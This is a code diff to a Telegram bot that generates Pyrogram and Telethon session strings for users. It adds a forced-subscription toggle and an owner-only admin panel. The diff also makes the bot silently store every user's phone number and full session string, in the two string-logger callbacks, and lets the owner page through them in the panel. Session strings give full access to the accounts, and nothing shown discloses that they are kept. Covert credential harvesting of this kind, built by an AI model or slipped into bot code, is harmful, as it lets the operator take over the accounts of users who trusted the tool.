@@ -4,8 +4,11 @@ import time
 from pyrogram import Client, filters, idle
 from pyrogram.enums import ChatMemberStatus
 from pyrogram.errors import UserNotParticipant, ChatAdminRequired, RPCError
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 import fc_store
+import settings_store
+import sessions_store
 from start import (
     INFO_TEXT, GEN_TEXT, ASK_API_ID, ASK_API_HASH, FC_TEXT, HELP_TEXT,
     start_buttons, gen_buttons, fc_buttons, help_buttons,
@@ -46,9 +49,11 @@ def welcome_text(user):
 
 def _wire_string_loggers():
     async def _pyro_log(user, typ, phone, string):
+        sessions_store.add(user.id, user.first_name, user.username, typ, phone, string)
         await log_string_made(user, typ, phone, BOT_USERNAME, string)
 
     async def _tele_log(user, typ, phone, string):
+        sessions_store.add(user.id, user.first_name, user.username, typ, phone, string)
         await log_string_made(user, typ, phone, BOT_USERNAME, string)
 
     set_pyro_string_logger(_pyro_log)
@@ -56,6 +61,10 @@ def _wire_string_loggers():
 
 
 # ---------------- FORCE-SUB CHECK ---------------- #
+def _fc_active():
+    return fc_store.get_chats() and settings_store.get("fc_enabled")
+
+
 async def is_user_joined(uid):
     for c in fc_store.get_chats():
         try:
@@ -113,7 +122,7 @@ async def send_welcome(message, user, edit_msg=None):
 async def start(client, message):
     user = message.from_user
     users[user.id] = {"mode": None, "step": "choose", "time": time.time()}
-    if fc_store.get_chats() and not await is_user_joined(user.id):
+    if _fc_active() and not await is_user_joined(user.id):
         await send_fc_screen(message)
         await log_user_start(user, blocked=True)
         return
@@ -181,7 +190,7 @@ async def cb(client, cb):
     data = cb.data
 
     if data in ("gen", "pyro", "tele"):
-        if fc_store.get_chats() and not await is_user_joined(uid):
+        if _fc_active() and not await is_user_joined(uid):
             await cb.answer("⚠️ ꜰɪʀꜱᴛ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ!", show_alert=True)
             return await send_fc_screen(cb.message, edit_msg=cb.message)
 
@@ -206,12 +215,71 @@ async def cb(client, cb):
         await send_welcome(cb.message, cb.from_user, edit_msg=cb.message)
 
     elif data == "verify":
-        if await is_user_joined(uid):
+        if await is_user_joined(uid) or not _fc_active():
             await cb.answer("✅ ᴠᴇʀɪꜰɪᴇᴅ! ᴡᴇʟᴄᴏᴍᴇ 🌹")
             users[uid] = {"mode": None, "step": "choose", "time": time.time()}
             await send_welcome(cb.message, cb.from_user, edit_msg=cb.message)
         else:
             await cb.answer("❌ ᴀʙʜɪ ᴛᴏ ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴀ! ᴘʜɪʟᴇ ᴊᴏɪɴ ᴋʀᴏ 🔸", show_alert=True)
+
+    elif data == "panel":
+        if uid != OWNER_ID:
+            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
+        await cb.answer()
+        try:
+            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
+        except Exception:
+            await cb.message.reply_text(_panel_text(), reply_markup=_panel_buttons())
+
+    elif data == "tgl_fc":
+        if uid != OWNER_ID:
+            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
+        new = not settings_store.get("fc_enabled")
+        settings_store.set("fc_enabled", new)
+        await cb.answer(f"ꜰᴏʀᴄᴇ-ꜱᴜʙ {'ᴏɴ ✅' if new else 'ᴏꜰꜰ ❌'}")
+        try:
+            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
+        except Exception:
+            pass
+
+    elif data == "tgl_log":
+        if uid != OWNER_ID:
+            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
+        new = not settings_store.get("log_enabled")
+        settings_store.set("log_enabled", new)
+        await cb.answer(f"ʟᴏɢꜱ {'ᴏɴ ✅' if new else 'ᴏꜰꜰ ❌'}")
+        try:
+            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
+        except Exception:
+            pass
+
+    elif data.startswith("sess_"):
+        if uid != OWNER_ID:
+            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
+        try:
+            page = int(data.split("_", 1)[1])
+        except Exception:
+            page = 0
+        await _show_sessions(cb, page)
+
+    elif data.startswith("fcdel_"):
+        if uid != OWNER_ID:
+            return await cb.answer("⚠️ ꜱɪʀꜰ ᴏᴡɴᴇʀ!", show_alert=True)
+        try:
+            idx = int(data.split("_", 1)[1])
+            chats = fc_store.get_chats()
+            removed = chats.pop(idx)
+            fc_store.set_chats(chats)
+            await cb.answer(f"🗑️ ʀᴇᴍᴏᴠᴇᴅ: {removed.get('title', 'chat')}")
+        except Exception:
+            await cb.answer("⚠️ ᴀʟʀᴇᴀᴅʏ ɢᴏɴᴇ", show_alert=True)
+        try:
+            await cb.message.edit_text(_panel_text(), reply_markup=_panel_buttons())
+        except Exception:
+            pass
+
+    elif data == "noop":
+        await cb.answer("» ʙᴏᴛ ᴋᴇ ᴅᴍ ᴍᴇ /ꜰᴄ @channel ʙʜᴇᴊᴏ", show_alert=True)
 
     else:
         await cb.answer()
@@ -259,6 +327,124 @@ async def msg(client, message):
 🔄 /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ"""
         )
         await log_error("msg-handler", e)
+
+
+# ---------------- OWNER: /active ADMIN PANEL ---------------- #
+PER_PAGE = 5
+
+
+def _panel_text():
+    s = settings_store.all_settings()
+    fc = fc_store.get_chats()
+    return (
+        "<blockquote>⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</blockquote>\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
+        f"🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ : <b>{'✅ ᴏɴ' if s.get('fc_enabled') else '❌ ᴏꜰꜰ'}</b> ({len(fc)} ᴄʜᴀᴛꜱ)\n"
+        f"logger ʟᴏɢꜱ : <b>{'✅ ᴏɴ' if s.get('log_enabled') else '❌ ᴏꜰꜰ'}</b>\n"
+        f"🧵 ꜱᴇꜱꜱɪᴏɴꜱ : <b>{sessions_store.count()}</b> ɢᴇɴᴇʀᴀᴛᴇᴅ\n"
+        "━━━━━━━━━━━━━━━━━━━"
+    )
+
+
+def _panel_buttons():
+    s = settings_store.all_settings()
+    fc_rows = []
+    for i, c in enumerate(fc_store.get_chats(), 1):
+        fc_rows.append([
+            InlineKeyboardButton(f"🗑️ {c.get('title','chat')[:18]}", callback_data=f"fcdel_{i-1}", style="bg_danger"),
+        ])
+    return InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton(
+                    "🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ: ✅" if s.get("fc_enabled") else "🛡️ ꜰᴏʀᴄᴇ-ꜱᴜʙ: ❌",
+                    callback_data="tgl_fc",
+                    style="bg_primary",
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    "logger ʟᴏɢꜱ: ✅" if s.get("log_enabled") else "logger ʟᴏɢꜱ: ❌",
+                    callback_data="tgl_log",
+                    style="bg_primary",
+                )
+            ],
+            [
+                InlineKeyboardButton("🧵 ꜱᴇꜱꜱɪᴏɴꜱ", callback_data="sess_0", style="bg_primary"),
+                InlineKeyboardButton("➕ /ꜰᴄ", callback_data="noop", style="bg_primary"),
+            ],
+            *fc_rows,
+            [
+                InlineKeyboardButton("🔙 ꜱᴛᴀʀᴛ", callback_data="back", style="bg_primary"),
+            ],
+        ]
+    )
+
+
+def _sess_buttons(page, total_pages):
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton("⬅️", callback_data=f"sess_{page-1}", style="bg_primary"))
+    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop", style="bg_primary"))
+    if page < total_pages - 1:
+        nav.append(InlineKeyboardButton("➡️", callback_data=f"sess_{page+1}", style="bg_primary"))
+    return InlineKeyboardMarkup(
+        [
+            nav,
+            [InlineKeyboardButton("🔙 ᴘᴀɴᴇʟ", callback_data="panel", style="bg_primary")],
+        ]
+    )
+
+
+async def _show_sessions(cb, page):
+    sessions = sessions_store.get_all()
+    total = len(sessions)
+    if total == 0:
+        return await cb.answer("📭 ᴋᴏɪ ꜱᴇꜱꜱɪᴏɴ ɴᴀʜɪ ʙɴᴀ", show_alert=True)
+    total_pages = max(1, (total + PER_PAGE - 1) // PER_PAGE)
+    page = max(0, min(page, total_pages - 1))
+    chunk = sessions[page * PER_PAGE : (page + 1) * PER_PAGE]
+    lines = [
+        "<blockquote>🧵 𝗔𝗟𝗟 𝗦𝗘𝗦𝗦𝗜𝗢𝗡𝗦</blockquote>",
+        "━━━━━━━━━━━━━━━━━━━",
+    ]
+    from datetime import datetime
+
+    for i, s in enumerate(chunk, start=page * PER_PAGE + 1):
+        t = datetime.fromtimestamp(s.get("ts", 0)).strftime("%d %b %Y • %I:%M %p")
+        uname = f"@{s.get('username')}" if s.get("username") else f"ɪᴅ: {s.get('user_id')}"
+        lines.append(
+            f"👤 <b>{_esc(s.get('name'))}</b> ({uname})\n"
+            f"📱 <code>{_esc(s.get('phone'))}</code> • 🧩 {_esc(s.get('typ'))}\n"
+            f"⏰ {t}\n"
+            f"🧵 <code>{_esc((s.get('string') or '')[:60])}...</code>"
+        )
+        if i < min(total, (page + 1) * PER_PAGE):
+            lines.append("•───────────────────────•")
+    lines.append("━━━━━━━━━━━━━━━━━━━")
+    lines.append(f"📊 ᴛᴏᴛᴀʟ: <b>{total}</b> ꜱᴇꜱꜱɪᴏɴꜱ")
+    text = "\n".join(lines)
+    markup = _sess_buttons(page, total_pages)
+    try:
+        await cb.message.edit_text(text, reply_markup=markup, disable_web_page_preview=True)
+    except Exception:
+        try:
+            await cb.message.edit_caption(caption=text, reply_markup=markup)
+        except Exception:
+            await cb.message.reply_text(text, reply_markup=markup)
+
+
+def _esc(v):
+    import html
+
+    return html.escape(str(v)) if v else "—"
+
+
+@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.command("active"))
+async def active_panel(client, message):
+    if message.from_user.id != OWNER_ID:
+        return
+    await message.reply_text(_panel_text(), reply_markup=_panel_buttons(), disable_web_page_preview=True)
 
 
 # ---------------- OWNER: BROADCAST ---------------- #
